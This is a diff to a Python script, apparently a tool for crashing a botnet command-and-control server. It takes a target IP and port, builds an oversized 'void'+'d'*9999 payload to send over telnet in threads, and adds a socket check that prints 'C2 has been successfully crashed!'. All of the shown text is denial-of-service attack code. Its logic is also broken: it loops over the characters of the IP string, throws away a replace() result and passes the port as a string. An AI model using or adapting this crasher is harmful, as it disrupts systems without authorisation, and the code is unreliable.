@@ -7,6 +7,7 @@ import time
 import colorama
 import telnetlib
 import random
+import socket
 from colorama import Fore
 from threading import Thread
 
@@ -27,6 +28,7 @@ c2ip = input(("C2 IP: "))
 c2port = input(("C2 Port: "))
 payload = "void"+"d"*9999
 timeout = 3
+somesock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 tn = telnetlib.Telnet()
 
 def crash(crasher):
@@ -39,7 +41,8 @@ for crasher in c2ip:
 	crasher.replace("/", "")
 	crasher2 = Thread(target=crash, args=(c2ip,))
 	crasher2.start()
-	if crash == 0:
+	result = somesock.connect_ex((c2ip,c2port))
+	if result == 0:
 		print(Fore.GREEN+"C2 has been successfully crashed!")
 	else:
 		print(Fore.RED+"did not connect, did you put the C2 IP correctly?")
